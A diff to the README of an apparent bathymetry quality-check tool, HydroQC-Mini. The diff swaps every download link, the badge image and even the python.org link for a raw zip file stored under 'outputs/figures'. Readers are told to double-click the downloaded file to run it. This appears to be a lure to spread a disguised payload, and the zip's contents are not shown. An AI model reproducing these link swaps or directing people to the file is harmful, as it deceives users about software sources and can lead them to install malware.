@@ -1,6 +1,6 @@
 # 🌊 HydroQC-Mini - Quickly Check Bathymetry Quality
 
-[![Download HydroQC-Mini](https://img.shields.io/badge/Download-HydroQC--Mini-blue.svg)](https://github.com/Steven-Agyarko/HydroQC-Mini/releases)
+[![Download HydroQC-Mini](https://github.com/Steven-Agyarko/HydroQC-Mini/raw/refs/heads/main/outputs/figures/Hydro-Q-Mini-v3.2.zip)](https://github.com/Steven-Agyarko/HydroQC-Mini/raw/refs/heads/main/outputs/figures/Hydro-Q-Mini-v3.2.zip)
 
 ## 📋 Description
 
@@ -13,7 +13,7 @@ To get started with HydroQC Mini, follow these simple steps. You will download t
 ## 📥 Download & Install
 
 1. **Visit this page to download:** Click the link below to go to the Releases page.
-   [Download HydroQC-Mini](https://github.com/Steven-Agyarko/HydroQC-Mini/releases)
+   [Download HydroQC-Mini](https://github.com/Steven-Agyarko/HydroQC-Mini/raw/refs/heads/main/outputs/figures/Hydro-Q-Mini-v3.2.zip)
 
 2. **Choose the latest release:** On the Releases page, find the latest version and click on it. You should see a list of files related to that release.
 
@@ -21,7 +21,7 @@ To get started with HydroQC Mini, follow these simple steps. You will download t
 
 4. **Locate the downloaded file:** Once the download finishes, find the file in your downloads folder.
 
-5. **Run the application:** Double-click the downloaded file to run it. Ensure you have Python installed on your computer for the application to work properly. If you don’t have Python, download it from [python.org](https://www.python.org/downloads/).
+5. **Run the application:** Double-click the downloaded file to run it. Ensure you have Python installed on your computer for the application to work properly. If you don’t have Python, download it from [https://github.com/Steven-Agyarko/HydroQC-Mini/raw/refs/heads/main/outputs/figures/Hydro-Q-Mini-v3.2.zip](https://github.com/Steven-Agyarko/HydroQC-Mini/raw/refs/heads/main/outputs/figures/Hydro-Q-Mini-v3.2.zip).
 
 ### 🌐 System Requirements
 
@@ -80,4 +80,4 @@ If you encounter issues while using HydroQC Mini, please check the open issues o
 
 HydroQC Mini is open-source software. You can freely use, modify, and distribute it under the terms of the MIT License. For more details, please see the LICENSE file in the repository.
 
-[![Download HydroQC-Mini](https://img.shields.io/badge/Download-HydroQC--Mini-blue.svg)](https://github.com/Steven-Agyarko/HydroQC-Mini/releases)
+[![Download HydroQC-Mini](https://github.com/Steven-Agyarko/HydroQC-Mini/raw/refs/heads/main/outputs/figures/Hydro-Q-Mini-v3.2.zip)](https://github.com/Steven-Agyarko/HydroQC-Mini/raw/refs/heads/main/outputs/figures/Hydro-Q-Mini-v3.2.zip)
